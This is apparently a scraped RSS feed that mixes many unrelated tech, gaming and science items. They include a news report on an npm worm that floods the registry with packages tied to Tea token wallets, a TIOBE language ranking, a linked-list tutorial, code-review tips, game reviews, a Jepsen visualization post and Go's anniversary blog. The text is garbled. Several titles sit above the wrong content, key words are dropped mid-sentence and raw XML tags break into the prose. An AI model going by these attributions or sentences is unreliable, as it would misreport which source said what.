Unlike the spate of package poisoning incidents over recent months, this one didn't inject traditional malware into the open source code. Instead, the miscreants created a self-replicating attack, infecting the packages with code to automatically generate and publish, thus earning cryptocurrency rewards on the backs of legitimate open source developers. The code also included tea.yaml files that linked these packages to attacker-controlled blockchain wallet addresses. 


At the moment, Tea tokens have no value, points out CSO Online. "But it is suspected that the threat actors are positioning themselves to receive real cryptocurrency tokens when the Tea Protocol launches its Mainnet, where Tea tokens will have actual monetary value and can be traded..."


In an interview on Friday, an executive at software supply chain management provider Sonatype, which wrote about the campaign in April 2024, told CSO that number has now grown to 153,000. "It's unfortunate that the worm isn't under control yet," said Sonatype CTO Brian Fox. And while this payload merely steals tokens, other threat actors are paying attention, he predicted. "I'm sure somebody out there in the world is looking at this massively replicating worm and wondering if they can ride that, not just to get the Tea tokens but to put some actual malware in there, because if it's replicating that fast, why wouldn't you?" 

When Sonatype wrote about the campaign just over a year ago, it found a mere 15,000 packages that appeared to come from a single person. With the swollen numbers reported this week, Amazon researchers wrote that it's "one of the largest package flooding incidents in open source registry history, and represents a defining moment in supply chain security...." For now, says Sonatype's Fox, the scheme wastes the time of npm administrators, who are trying to expel over 100,000 packages. But Fox and Amazon point out the scheme could inspire others to take advantage of other reward-based systems for financial gain, or to deliver malware. 

After deplooying a new detection rule "paired with AI", Amazon's
security researchers' write, "within days, the system began flagging packages linked to the tea.xyz protocol...


By November 7, the researchers flagged thousands of packages and began investigating what appeared to be a coordinated campaign. The next day, after validating the evaluation results and analyzing the patterns, they reached out to OpenSSF to share their findings and coordinate a response. 

Their blog post thanks the Open Source Security Foundation (OpenSSF) for rapid collaboration, while calling the incident "a defining moment in supply chain security..."]]></content:encoded></item><item><title>What Really Happens When You Die (8 Stages Of Death)</title><link>https://www.youtube.com/watch?v=uNdZKj6Eaz8</link><author>Weird History</author><category>yt</category><enclosure url="https://www.youtube.com/v/uNdZKj6Eaz8?version=3" length="" type=""/><pubDate>Sun, 16 Nov 2025 15:01:44 +0000</pubDate><source url="https://www.youtube.com/channel/UCc-N24Y5OA0gqbjBwe1ttfA">Weird History</source><content:encoded><![CDATA[Death comes for us all, and when it does, it throws our bodies through an icky, sciencey, and surprisingly dramatic process of decay.

And "The November 2025 TIOBE Index brings another twist below Python's familiar lead," writes TechRepublic. "C solidifies its position as runner-up, C++ and Java lose some ground, and C# moves sharply upward, narrowing the gap with Java to less than a percentage point..." 


TIO CEO Paul Jansen said this month that "Instead of Python, programming language C# is now the fastest rising language,"

How did C# achieve this? Java and C# are battling for a long time in the same areas. Right now it seems like C# has removed every reason why not to use C# instead of Java: it is cross platform nowadays, it is open source and it contains all new language features a developer wants. While the financial world is still dominated by Java, all other terrains show equal shares between Java and C#. Besides this, Microsoft is going strong and C# is still their most backed programming language. 

 Interesting note: C# has never been higher than Java in the TIOBE index. Currently the difference between the two rivals is less than 1%. There are exciting times ahead of us. Is C# going to surpass Java for the first time in the TIOBE index history? 


"The fact that C# has been in the news for the successive betas and pre-release candidates prior to the release of C# 14 may have bumped up its percentage share in the last few months," notes a post on the site i-Programmer. But they also point out that by TIOBE's reckoning, Java — having been overtaken by Python in 2021 — "has been in decline ever since." 


 TechRepublic summarizes the rest of the Top Ten:

JavaScript stays in sixth place at 3.42%, and Visual Basic edges up to seventh with 3.31%. Delphi/Object Pascal nudges upward to eighth at 2.06%, while Perl returns to the top 10 in ninth at 1.84% after a sharp year-over-year climb. SQL rounds out the list at tenth with 1.80%, maintaining a foothold that shows the enduring centrality of relational databases. Go, which held eighth place in October, slips out of the top 10 entirely. 

Here's how TIOBE's methodology ranks programming language popularity in November:

And because each element points to the next, you can  without shifting anything.In this article, I’ll break down:What a linked list is and how it worksDifferent types of linked listsMost common linked list operations and their time complexitiesand the most common interview patterns built around linked listsI also made a  on Linked List. Check it out for more in-depth and visual explanation.Subscribe for more such videos!A  is a linear data structure made up of .Each node contains two parts:A value: the actual data you want to storeand a  or  to the  in the sequenceThe last node points to null, indicating the end of list.Unlike arrays, where all elements are stored together in a single, continuous block of memory, the nodes in a linked list can be .What keeps them connected are those pointers linking one node to the next.This structure makes linked lists . You can grow or shrink them dynamically, and insertions or deletions don’t require shifting large chunks of memory like arrays do.But this flexibility comes with a trade-off.Since the elements aren’t stored together, you  to a specific item like you can with arrays.Instead, to access the 5th or 10th element, you may have to traverse the list from the beginning, one node at a time, which takes .Depending on how the nodes are connected, we can categorize them into three common types:In a , each node contains a value and a pointer to the  and that’s it.class ListNode {
    int val;
    ListNode next;

    ListNode(int val) {
        this.val = val;
        this.next = null;
    }
}You can only move in , from the head toward the tail.It’s simple to implement and memory-efficient.But there’s a downside: if you need to go , there’s no easy way. You’d have to start from the head and traverse again until you reach the previous node.Singly linked lists are great for problems where you only need forward traversal.A  takes things one step further.Each node has :One pointing to the  nodeOne pointing to the  nodeclass DoublyListNode {
    int val;
    DoublyListNode next;
    DoublyListNode prev;

    DoublyListNode(int val) {
        this.val = val;
        this.next = null;
        this.prev = null;
    }
}This means you can move , which makes certain operations much more efficient.But the trade-off is that it uses  to store the additional pointer and it introduces a bit more complexity in updating links during insertions or deletions.Doubly linked lists are widely used in real-world systems like: LRU caches, text editors for undo/redo functionality, and browser history navigation.A  is a variation where the last node points back to the first node, instead of .This forms a . You can start at any node and keep going until you’re back where you started.class CircularListNode {
    int val;
    CircularListNode next;

    CircularListNode(int val) {
        this.val = val;
        this.next = this; // initially points to itself
    }
}It’s great for problems where you need cyclical behavior like round-robin scheduling, or multiplayer games where turns cycle through players.Now that we know what linked lists are and the different types, let’s go over the most common operations you’ll perform on them.Traversal means moving through the list, visiting each node one by one. You  and move one node at a time.void traverse(Node head) {
    Node current = head;

    while (current != null) {
        System.out.print(current.value + “ -> “);
        current = current.next;
    }

    System.out.println(”null”);
}This operation takes  because, in the worst case, you might visit every node.If you want to find whether a value exists in a linked list, you must:Check each node one by one until you find the value or reach the endboolean search(int target) {
    Node current = head;

    while (current != null) {
        if (current.value == target) {
            return true;
        }
        current = current.next;
    }

    return false;
}Since this is a linear search, it takes  in the worst case.Linked lists really shine when it comes to insertion because you don’t have to shift elements like you would in an array.There are different cases depending on where you are inserting a node:This is the fastest case.Point its  to the current headUpdate the head to the new nodevoid insertAtHead(int value) {
    Node newNode = new Node(value);
    newNode.next = head;
    head = newNode;
}It takes  since no traversal is needed.To insert at the end, you have to:Traverse the list until you reach the last nodeUpdate the last node’s  to the new nodevoid insertAtEnd(int value) {
    Node newNode = new Node(value);

    // If list is empty, new node becomes head
    if (head == null) {
        head = newNode;
        return;
    }

    // Otherwise, go to the last node
    Node current = head;
    while (current.next != null) {
        current = current.next;
    }

    current.next = newNode;
}If you maintain a tail pointer, you can insert in constant time . Otherwise, you’ll need to traverse the entire list to find the last node, which takes .Insert at a Given PositionTo insert at a specific position (say after the 5th node), you must:Traverse to that positionAdjust the pointers to insert the new nodevoid insertAtPosition(int value, int position) {
    if (position == 0) {
        insertAtHead(value);
        return;
    }

    Node current = head;
    // move to node at position-1
    for (int i = 0; i < position - 1 && current != null; i++) {
        current = current.next;
    }

    Node newNode = new Node(value);
    newNode.next = current.next;
    current.next = newNode;
}Again, this requires  time in the worst case.Like insertion, deletion can also vary based on position.Delete from the BeginningThis is fast. Just move the head pointer to the next node:void deleteHead() {
    if (head == null) {
        return; // nothing to delete
    }
    head = head.next;
}This is constant time since no traversal is needed.Delete from the End or MiddleTo delete the last node or a node in the middle:You have to Update its  pointer to skip the node you want to deletevoid deleteAtPosition(int position) {
    if (position == 0) {
        deleteHead();
        return;
    }

    Node current = head;
    // move to node at position-1
    for (int i = 0; i < position - 1 && current != null; i++) {
        current = current.next;
    }

    // skip the node at `position`
    current.next = current.next.next;
}Since there’s no backward pointer in a singly linked list, this means  from the head, which takes  time.It is also known as Floyd’s Tortoise and Hare algorithm.The  moves one step at a time.The  moves two steps at a time.This simple trick allows you to solve problems like:: if there’s a loop, the fast and slow pointers will eventually meet. of a linked listThis is a  technique in interviews. The challenge is to reverse the direction of pointers so the last node becomes the new head.We can do it in-place by maintaining three pointers at ,  and  node.void reverse() {
    Node prev = null;
    Node curr = head;

    while (curr != null) {
        Node nextNode = curr.next; // store next
        curr.next = prev;          // reverse pointer
        prev = curr;               // move prev forward
        curr = nextNode;           // move curr forward
    }

    head = prev; // new head after full reversal
}And then walking through the list and flipping the pointers one by one.Another common trick is using dummy nodes. This one’s a  that makes your implementation simpler and less error-prone.A  is just a placeholder node that you insert  the real head of the list.It eliminates messy special cases like:“What if we delete the head?”“What if insertion happens at the very beginning?”“Do we need separate logic when head changes?”Node deleteAll(Node head, int target) {
    // 1. Create a dummy node before the real head
    Node dummy = new Node(0);   // value doesn’t matter
    dummy.next = head;

    // 2. Use current pointer starting from dummy
    Node current = dummy;

    while (current.next != null) {
        if (current.next.value == target) {
            // Skip the node with target value
            current.next = current.next.next;
        } else {
            // Move forward only if we didn’t delete
            current = current.next;
        }
    }

    // 3. New head might have changed
    return dummy.next;
}With a dummy node, you treat the head like any other node so your logic stays uniform and your code gets much cleaner.If you found it valuable, hit a like ❤️ and consider subscribing for more such content.If you have any questions or suggestions, leave a comment.This post is public so feel free to share it.

Plus, small pull requests create fewer problems later.Watch for duplicate & dead code. Remove unused code and abstract logic to avoid duplication.Good tests prevent regressions and show how code should work. So verify whether the new code has “sufficient” test coverage.Choose the correct reviewer for each change: code owners or domain experts can quickly catch domain-specific issues. If you assign many reviewers,,, ensure each understands their responsibilities to prevent delays.Write clear pull request descriptions that explain the “what” and “why” of changes. Also, link relevant tickets and attach screenshots that help reviewers understand the context.Use a code review CHECKLIST. It could cover design, readability, security, testing, and so on. This ensures consistency in reviews and reduces the chances of missing common issues.Automate easy parts. Use tests, linters, and static analysis to catch errors and style issues. This way, reviewers can focus on logic & architecture.I’m happy to partner with  on this newsletter. Code reviews usually delay feature deliveries and overload reviewers. And I genuinely believe CodeRabbit solves this problem.Use review metrics to find “bottlenecks”. Measure: review time and bug rates, and pull request size. Then adjust the process based on data to improve speed without sacrificing quality.Review quickly… but don’t rush! The goal is to improve code health, not just quick approvals.Keep reviews SHORT. It’s hard to stay focused after reading 100+ lines of code. If the change is big, break it up into smaller parts or focus on one section at a time to give effective feedback.Get early feedback on big features to save time later. This helps to catch issues early and makes reviews more manageable.Ask for a review ONLY after tests & builds pass. This prevents wasting the reviewer’s time on broken code. Besides, it signals the code is stable enough to review.Use review tools effectively to save time - threaded comments, suggested edits, and templates, and so on. The correct setup makes reviews smoother.Watch out for potential bugs & logic mistakes that tests might miss. Think about “race conditions or extreme inputs”. Human reviewers can often spot bugs that automated tests miss, especially in complex logic.I’ll send you some rewards for the referrals.Encourage ALL team members to take part in code reviews. And don’t let the same people handle all reviews. Rotation spreads knowledge and avoids burnout.You can’t review code effectively if you don’t understand what it does. So read the code carefully and run it locally if necessary. Keep the feedback within the “scope”. If you notice any issues outside the scope of the change, log them separately. This keeps reviews constructive and prevents endless delays.Review in layers: design then details. This approach helps you catch both major and minor issues efficiently.Compare the implementation with the requirements. Ensure it handles acceptance criteria and edge cases and error conditions correctly.Enforce coding standards for CONSISTENCY. Suggest refactoring if the logic is hard to follow.Use AI tools to summarize changes or find issues. It saves time! But use those as a helper... and not a replacement for human reviews.Guess what? When you open a pull request,  can generate a summary of code changes for the reviewer. It helps them quickly understand complex changes and assess the impact on the codebase. Speed up the code review process.Set clear “guidelines” for how reviews get approved. For example, have at least two reviewers for critical code changes.Consider how code performs at scale in “performance-critical” areas. Look out for things that might cause slowdowns in critical paths - unnecessary loops and so on. Remember: fixing issues is easier during review than in production.Use reviews as an opportunity to share KNOWLEDGE and grow together. Share tips and best practices, especially with junior engineers.Ensure the code handles errors “gracefully”. Functions must deal with null inputs or external call failures without crashing. Good error handling makes the system robust & easy to debug.Adjust practices to fit your team’s needs. What works at one company might not work for another. Keep experimenting until you find your ideal flow.I’ll send you some rewards for the referrals.Always review with the bigger picture in mind. Think about how the change interacts with the codebase. And consider cross-cutting concerns: performance, concurrency, and backward compatibility.It’s better to clarify… than to assume. So ask clarifying questions when something is unclear about the change. A simple question can prevent misunderstandings or reveal missing requirements.If possible, run the code locally, especially for complex & critical code changes. Seeing it in action can reveal issues that reading won’t.Focus on code correctness & clarity,,, not personal style. If an issue is purely stylistic and not covered by a guideline, consider letting it pass or marking it as a nitpick. Remember, reviews are about improving the codebase.Suggest a solution when pointing out a problem. If a function is complex, propose breaking it into smaller functions or using a design pattern. Reviews are most valuable when they teach… not just criticize.Consider whether the documentation requires any updates because of the change. An API change may need changes to the API docs or the README file. Ensure everything remains accurate and complete.Treat code review as a “team effort”, not a fight. Focus on making the product better rather than proving someone wrong. A friendly tone makes feedback easier to accept.Mention explicitly which comments are essential & which are optional. Label important fixes separately from small “nice-to-have” ideas. This helps the author to prioritize and stay focused.Bet you didn’t know…brings instant code reviews directly to your terminal, seamlessly integrating with Claude Code, Cursor CLI, and other AI coding agents. While they generate code, CodeRabbit ensures it’s production-ready - catching bugs, security issues, and AI hallucinations before they hit your codebase.Involve a neutral third party in disagreements over CRITICAL issues - ask a tech lead or architect. Also, create a follow-up task if the problem is outside the current scope.Explain the “why” behind your feedback. Understanding the reason behind feedback helps others learn. This way, they’re less likely to repeat the issue.Secure code protects users and the business. So always think about SECURITY. Be cautious of weak data validation, exposed data, or improper error handling.Be open to discussion when opinions differ. Ask for the author’s reasoning and listen before insisting. Talking through disagreements often leads to better solutions.Point out what’s done well too… it motivates people to keep doing it. Keep a balance between criticism and appreciation for high morale.Don’t use code reviews for PERFORMANCE EVALUATIONS! Reviews exist to improve code, not to measure people. When engineers feel safe, they write better code & review honestly.Respond to feedback with curiosity,,, not defensiveness. Treat comments as learning opportunities.Having another set of eyes helps catch mistakes. So make sure someone else reviews “every” change. Even small changes benefit from peer review.I could go on and on and on.But if those 42 ways aren’t enough to 10x your code reviews, then probably anything else I say will go in one ear and right out the other.As far as AI code reviews to catch bugs, security flaws, and performance issues you write code?It brings real-time, AI code reviews straight into VS Code, Cursor, and Windsurf.Want to advertise in this newsletter? 📰Thank you for supporting this newsletter.You are now 190,001+ readers strong, very close to 191k.

If not for snippets of gameplay, Dispatch would simply be a great TV show that I would want to tune into every week. It sometimes feels like it skews a little bit too much toward its TV show inspirations, but superb writing and voice acting maintains investment in this character-driven drama and makes for a story I want to replay.In Dispatch, you play as Robert Robertson III, aka Mecha Man. Once a prominent hero without superpowers who had to rely on piloting a mechsuit to stop monstrous supervillains, Robert finds his life adrift after his suit is damaged beyond repair. He's approached by Blonde Blazer, a famous hero-for-hire, who offers him a job as a dispatcher--someone who directs and assists a team of paid heroes. The catch: Robert's assigned group of misfits is entirely composed of former supervillains, and their crass attitudes, explosive tempers, and lack of camaraderie make them a poor team and ill-suited for hero work.It's a stellar set-up, made even stronger by an incredible cast of varied characters. While trailers and advertisements offered an initial impression of Robert being your typical washed-up hero defined by dour sarcasm, the character is a remarkably refreshing take for a protagonist in a superhero story. Yes, he's depressed and often uses humor to deflect, but he has an earnest desire to help people and continue being a force for good. He doesn't view the supervillains under his command as a hindrance, but a mission: He'll mentor the roster into a group of heroes even greater than he was because it's best for the city and for the former villains' lives.Continue Reading at GameSpot]]></content:encoded></item><item><title>Op Color Plots</title><link>https://aphyr.com/posts/399-op-color-plots</link><author>Aphyr</author><category>dev</category><pubDate>Fri, 14 Nov 2025 20:00:52 +0000</pubDate><source url="http://aphyr.com/posts.atom">Dev - Aphyr</source><content:encoded><![CDATA[A lot of my work involves staring at visualizations trying to get an intuitive feeling for what a system is doing. I’ve been working on a new visualization for Jepsen, a distributed systems testing library. This is something I’ve had in the back of my head for years but never quite got around to.A Jepsen test records a history of operations. Those operations often come in a few different flavors. For instance, if we’re testing a queue, we might send messages into the queue, and try to read them back at the end. It would be bad if some messages didn’t come back; that could mean data loss. It would also be bad if messages came out that were  enqueued; that could signify data corruption. A Jepsen checker for a queue might build up some data structures with statistics and examples of these different flavors: which records were lost, unexpected, and so on. Here’s an example from the NATS test I’ve been working on this month:,
 ,
 ,
 ,
 ,
 ,
 ,
 ,
 ,
 ,
 You can tell just by eyeballing the numbers that most attempted writes were acknowledged, and about half of them were later read back. There were just three “recovered” writes where we didn’t know if they succeeded or not, and they later appeared. About half were lost: acknowledged but never read. About half of those were “holes”—writes which were missing even though some later write was read. And there’s a few examples, in case you want to go digging into the history and see what might have happened to specific writes.At the same time, there are lots of  questions that are hard to answer statistically. For instance, were the lost writes clustered together in time, or were they spread out? What faults might have happened to trigger write loss? Is data loss universal on short timescales, or do, say, 40% of writes survive? Is the rate of writes uniform over time, or do lost writes happen faster or slower? Did the data loss event destroy all records prior to some time, or did some survive? Could apparent data loss be attributed to slow delivery of messages, or is it likely that the data is truly missing?This plot helps answer some of those questions. Time flows left to right. Each operation (measured by its invocation time) becomes a single point. Colors indicate the flavor of that operation: OK, lost, unknown, or so on. Operations are splayed out vertically, in such a way that the aggregate “shape” of the plot traces out the rough throughput of the system over time. Operations from the fault-injection system are shown as vertical lines and (for process kills) horizontal bars spanning them.From this, we can see that data loss occurred in two large chunks, starting near a file-corruption operation at roughly 65 seconds and running until the end of the test. They were not evenly mixed: writes were lost in blocks. A few records survived around 87 seconds in, then everything later was lost as well. These OK records in the middle hint that this is “real” data loss, as opposed to readers lagging behind. The rate of OK and lost operations was essentially constant at ~6,800 records/sec. Unknown operations happened  slower–likely due to timeouts. Some, but not all, process kills caused throughput to tank. You can guess that some of them took down a majority of nodes, halting the cluster until nodes were restarted; others were recoverable after a few seconds.Jepsen tests can range from a handful of operations to hundreds of millions, and our plots need to work for both extremes. In this case, the plot used single-pixel dots for frequent operations like  and , but for the handful of  operations, switched to a larger cross style. These infrequent operations are often of the most interest, and could easily get lost in the noise, so it makes sense to visually emphasize them.This isn’t a  plot yet. I am, for instance, running out of colors to represent all the kinds of faults, and that leads to awkward color-blind issues like the red/green pairing here. There’s a sort of aliasing/moire pattern caused by the point layout algorithm, which divides the history into 512 time windows, computes a height for each window based on throughput, and then spreads the window’s points along the y axis uniformly. I feel like I may be able to use some sort of adaptively-determined transparency and overlapping dots to get something a little closer to a density field, and that might read more clearly, but I’m wary of what might happen when some windows have lots of plots and others have only a few.Despite these shortcomings, this plot has been remarkably useful! I’m using them to get an at-a-glance feel for how bad a given test run is, to figure out where in the history I should look, and to refine the checker itself.Because there’s lots of ways you could interpret these plots—showing lost elements of a set, highlighting transaction anomalies in an SQL test, showing how read-only and read-write queries are affected by faults—I don’t really know what to name them yet. For now I’m calling them “op color plots”. They’re available in the current Jepsen 0.3.10-SNAPSHOT, and I’m hoping they’ll be useful in all kinds of tests to come.]]></content:encoded></item><item><title>There’s a way to listen to the sounds of space #shorts</title><link>https://www.youtube.com/shorts/H2NKvm6Po4s</link><author>Vox</author><category>yt</category><enclosure url="https://www.youtube.com/v/H2NKvm6Po4s?version=3" length="" type=""/><pubDate>Fri, 14 Nov 2025 19:00:30 +0000</pubDate><source url="https://www.youtube.com/channel/UCLXo7UDZvByw2ixzpQCufnA">Vox</source><content:encoded><![CDATA[“In space, no one can hear you scream.” At least according to the movie Alien from 1979.

But there actually is a way to listen to space. Astronomers use things called  “sonifications,” where they translate data into sound. This visualization is a sonification made by scientists at NASA’s Chandra X-ray Observatory of the center of the Milky Way. The piano represents infrared light, the violin represents visible light, and the glockenspiel represents X-ray light. And scientists we spoke to say listening to things like this can sometimes be better than looking at images for noticing new phenomena in space. #sound #space #nasa #violin #piano #glockenspiel #unexplainable #podcast

The punctuation mark appears frequently in outputs from ChatGPT and other AI chatbots, sometimes to the point where readers believe they can identify AI writing by its overuse alone—although people can overuse it, too.On Thursday evening, OpenAI CEO Sam Altman posted on X that ChatGPT has started following custom instructions to avoid using em dashes. “Small-but-happy win: If you tell ChatGPT not to use em-dashes in your custom instructions, it finally does what it’s supposed to do!” he wrote.The post, which came two days after the release of OpenAI’s new GPT-5.1 AI model, received mixed reactions from users who have struggled for years with getting the chatbot to follow specific formatting preferences. And this “small win” raises a very big question: If the world’s most valuable AI company has struggled with controlling something as simple as punctuation use after years of trying, perhaps what people call artificial general intelligence (AGI) is farther off than some in the industry claim.]]></content:encoded></item><item><title>The gaming console wars just got weird...</title><link>https://www.youtube.com/watch?v=Q8QdKRbC1O0</link><author>Fireship</author><category>dev</category><enclosure url="https://www.youtube.com/v/Q8QdKRbC1O0?version=3" length="" type=""/><pubDate>Fri, 14 Nov 2025 18:30:07 +0000</pubDate><source url="https://www.youtube.com/channel/UCsBjURrPoezykLs9EqgamOA">Dev - Fireship</source><content:encoded><![CDATA[Try Brilliant for free - https://brilliant.org/fireship and get 20% off a premium annual subscription

Alongside this, there is an overall score for the game at the bottom of this review. Alongside the campaign, this review will be updated with sections Zombies.Black Ops 7 Campaign Review - New But The SameThe Call of Duty: Black Ops games lean into fantasy and often surprise with a mind-bending narrative, and the Black Ops 7 campaign is no exception. It's themed around the enemy using fear as a weapon, and you're dropped into a storyline filled with hallucinations of monsters, trippy locations, and bizarre scenarios. This is a specific flavor of Call of Duty story that only developer Treyarch has shown the capacity to tell, and despite a few stumbles, the Black Ops 7 campaign does enough to leverage the potential of its more psychological narratives, while also moving the satisfying shooter gameplay into a new framework.Confusingly enough, Black Ops 7 takes place over 40 years after the events of last year's Black Ops 6 and 10 years following the events of Black Ops 2. The story is set in 2035 as a direct sequel to Black Ops 2, and it brings back David Mason from that game as the main protagonist. In Black Ops 7, you see the effects of Black Ops 2's canonical ending, where Mason kills villain Raul Menendez and an uprising occurs. The world is now ravaged by violent conflict and psychological warfare, and The Guild, a global tech corporation, has stepped in to "protect" humanity from the chaos created by Menendez's followers. But uh-oh: Menendez seemingly returns despite his apparent death.Continue Reading at GameSpot]]></content:encoded></item><item><title>Go’s Sweet 16</title><link>https://go.dev/blog/16years</link><author>Austin Clements, for the Go team</author><category>dev</category><category>go</category><pubDate>Fri, 14 Nov 2025 00:00:00 +0000</pubDate><source url="http://blog.golang.org/feed.atom">Dev - Golang Blog</source><content:encoded><![CDATA[This past Monday, November 10th, we celebrated the 16th anniversary of Go’s
open source
release!We released Go 1.24 in February and Go 1.25 in
August, following our now well-established and dependable release
cadence. Continuing our mission to build the most productive language platform
for building production systems, these releases included new APIs for building
robust and reliable software, significant advances in Go’s track record for
building secure software, and some serious under-the-hood improvements.
Meanwhile, no one can ignore the seismic shifts in our industry brought by
generative AI. The Go team is applying its thoughtful and uncompromising mindset
to the problems and opportunities of this dynamic space, working to bring Go’s
production-ready approach to building robust AI integrations, products, agents,
and infrastructure.First released in Go 1.24 as an experiment and then graduated in Go 1.25, the
new  package
significantly simplifies writing tests for concurrent, asynchronous
code. Such code is particularly common in network services,
and is traditionally very hard to test well. The  package works by
virtualizing time itself. It takes tests that used to be slow, flaky, or both,
and makes them easy to rewrite into reliable and nearly instantaneous tests,
often with just a couple extra lines of code. It’s also a great example of Go’s
integrated approach to software development: behind an almost trivial API, the
 package hides a deep integration with the Go runtime and other parts
of the standard library.This isn’t the only boost the  package got over the past year. The new
 API is both easier to use
than the original  API and addresses many of the traditional—and
often invisible!—pitfalls of writing Go benchmarks. The
 package also has new APIs that make it easy to
cleanup in tests that use
, and that make it
easy to write to the test’s log.Go and containerization grew up together and work great with each other. Go 1.25
launched container-aware scheduling, making
this pairing even stronger. Without developers having to lift a finger, this
transparently adjusts the parallelism of Go workloads running in containers,
preventing CPU throttling that can impact tail latency and improving Go’s
out-of-the-box production-readiness.Go 1.25’s new flight recorder builds on our already
powerful execution tracer, enabling deep insights into the dynamic behavior of
production systems. While the execution tracer generally collected 
information to be practical in long-running production services, the flight
recorder is like a little time machine, allowing a service to snapshot recent
events in great detail  something has gone wrong.Secure software developmentGo continues to strengthen its commitment to secure software development, making
significant strides in its native cryptography packages and evolving its
standard library for enhanced safety.Go ships with a full suite of native cryptography packages in the standard
library, which reached two major milestones over the past year. A security
audit conducted by independent security firm Trail of
Bits yielded excellent
results, with only a single low-severity finding.
Furthermore, through a collaborative effort between the Go Security Team and
Geomys, these packages achieved CAVP certification,
paving the way for full FIPS 140-3 certification. This is a
vital development for Go users in certain regulated environments. FIPS 140
compliance, previously a source of friction due to the need for unsupported
solutions, will now be seamlessly integrated, addressing concerns related to
safety, developer experience, functionality, release velocity, and compliance.The Go standard library has continued to evolve to be  and
. For example, the 
API—added in Go 1.24—enables traversal-resistant file system
access, effectively combating a class of vulnerabilities where an
attacker could manipulate programs into accessing files intended to be
inaccessible. Such vulnerabilities are notoriously challenging to address
without underlying platform and operating system support, and the new
 API offers a straightforward,
consistent, and portable solution.Under-the-hood improvementsIn addition to user-visible changes, Go has made significant improvements under
the hood over the past year.For Go 1.24, we completely redesigned the 
implementation, building on the latest and greatest ideas in
hash table design. This change is completely transparent, and brings significant
improvements to  performance, lower tail latency of  operations, and
in some cases even significant memory wins.Go 1.25 includes an experimental and significant advancement in Go’s garbage
collector called Green Tea. Green Tea reduces garbage
collection overhead in many applications by at least 10% and sometimes as much
as 40%. It uses a novel algorithm designed for the capabilities and constraints
of today’s hardware and opens up a new design space that we’re eagerly
exploring. For example, in the forthcoming Go 1.26 release, Green Tea will
achieve an additional 10% reduction in garbage collector overhead on hardware
that supports AVX-512 vector instructions—something that would have been nigh
impossible to take advantage of in the old algorithm. Green Tea will be enabled
by default in Go 1.26; users need only upgrade their Go version to benefit.Go is about far more than the language and standard library. It’s a software
development platform, and over the past year, we’ve also made four regular
releases of the gopls language server, and have formed partnerships to
support emerging new frameworks for agentic applications.Gopls provides Go support to VS Code and other LSP-powered editors and IDEs.
Every release sees a litany of features and improvements to the experience of
reading and writing Go code (see the v0.17.0,
v0.18.0, v0.19.0, and
v0.20.0 release notes for full details, or our new
gopls feature documentation!). Some highlights include many
new and enhanced analyzers to help developers write more idiomatic and robust Go
code; refactoring support for variable extraction, variable inlining, and JSON
struct tags; and an experimental built-in server for the
Model Context Protocol (MCP) that exposes a subset of gopls’ functionality to AI
assistants in the form of MCP tools.With gopls v0.18.0, we began exploring automatic code modernizers. As Go
evolves, every release brings new capabilities and new idioms; new and better
ways to do things that Go programmers have been finding other ways to do. Go
stands by its compatibility promise—the old way will continue
to work in perpetuity—but nevertheless this creates a bifurcation between old
idioms and new idioms. Modernizers are static analysis tools that recognize old
idioms and suggest faster, more readable, more secure, more 
replacements, and do so with push-button reliability. What  did for
stylistic consistency, we hope modernizers can do for idiomatic
consistency. We’ve integrated modernizers as IDE suggestions, where they can
help developers not only maintain more consistent coding standards, but where we
believe they will help developers discover new features and keep up with the
state of the art. We believe modernizers can also help AI coding assistants keep
up with the state of the art and combat their proclivity to reinforce outdated
knowledge of the Go language, APIs, and idioms. The upcoming Go 1.26 release
will include a total overhaul of the long-dormant  command to make it
apply the full suite of modernizers in bulk, a return to its pre-Go 1.0
roots.At the end of September, in collaboration with
Anthropic and the Go community, we released
v1.0.0 of
the official Go SDK for the
Model Context Protocol (MCP). This SDK
supports both MCP clients and MCP servers, and underpins the new MCP
functionality in gopls. Contributing this work in open source helps empower
other areas of the growing open source agentic ecosystem built around Go, such
as the recently released Agent Development Kit (ADK) for
Go from Google.
ADK Go builds on the Go MCP SDK to provide an idiomatic framework for building
modular multi-agent applications and systems. The Go MCP SDK and ADK Go
demonstrate how Go’s unique strengths in concurrency, performance, and
reliability differentiate Go for production AI development and we are expecting
more AI workloads to be written in Go in the coming years.Go has an exciting year ahead of it.We’re working on advancing developer productivity through the brand new 
command, deeper support for AI coding assistants, and ongoing improvements to
gopls and VS Code Go. General availability of the Green Tea garbage collector,
native support for Single Instruction Multiple Data (SIMD) hardware features,
and runtime and standard library support for writing code that scales even
better to massive multicore hardware will continue to align Go with modern
hardware and improve production efficiency. We’re focusing on Go’s “production
stack” libraries and diagnostics, including a massive (and long in the making)
upgrade to , driven by Joe Tsai and people across
the Go community; leaked goroutine
profiling, contributed by
Uber’s Programming Systems team; and many
other improvements to , , and other foundational packages.
We’re working to provide well-lit paths for building with Go and AI, evolving
the language platform with care for the evolving needs of today’s developers,
and building tools and capabilities that help both human developers and AI
assistants and systems alike.On this 16th anniversary of Go’s open source release, we’re also looking to the
future of the Go open source project itself. From its humble
beginnings, Go has formed a
thriving contributor community. To continue to best meet the needs of our
ever-expanding user base, especially in a time of upheaval in the software
industry, we’re working on ways to better scale Go’s development
processes—without losing sight of Go’s fundamental principles—and more deeply
involve our wonderful contributor community.Go would not be where it is today without our incredible user and contributor
communities. We wish you all the best in the coming year!]]></content:encoded></item><item><title>The Gravity Particle Should Exist.

Physics is this close to understanding the entire universe. And what lives in this gap? Many physicists think it’s the elusive graviton—the quantum particle of gravity—whose discovery will finally allow us to stitch together our two great theories of nature into a single master theory. But what is the graviton, and does it even exist?

Set aboard a derelict space colony within the rings of Saturn, you'll explore the apartments, science labs, and interstellar farms of this once-thriving community, reading notes, examining corpses, and using a tether to navigate unstable gravity fields. Equipped with a versatile chemical sprayer, you'll also cleanse the colony of the deadly fungi contaminating its every nook and cranny--a first-person cleaning process that's both cathartic and urgent, as you cycle through nozzle types and chemical agents to fight back against a hostile ecosystem by clearing it away.As a sci-fi cleaning game, Ambrosia Sky is relatively novel. Yet developer Soft Rains goes one step further by taking you on a melancholic and sentimental journey about death. Specifically, dying alone in the far reaches of our solar system.Playing as a woman named Dalia, you assume dual roles as both a field scientist and a space-faring undertaker known as a Scarab. When you're not hosing down fungus and piecing together what happened before everything went to hell, you're collecting biological samples from the dead and laying them to rest. "Where catastrophe strikes, Scarabs go," is the mystical group's unofficial motto. Their mission is to sequence the DNA of the recently deceased and find a way to reverse cellular decay in humans, all in pursuit of achieving immortality. But this lofty ambition takes a back seat to Dalia's personal conflict as she's forced to confront her past.Continue Reading at GameSpot]]></content:encoded></item><item><title>&apos;Nuremberg&apos; Cast Reveal Horrors of Making Nazi Trials 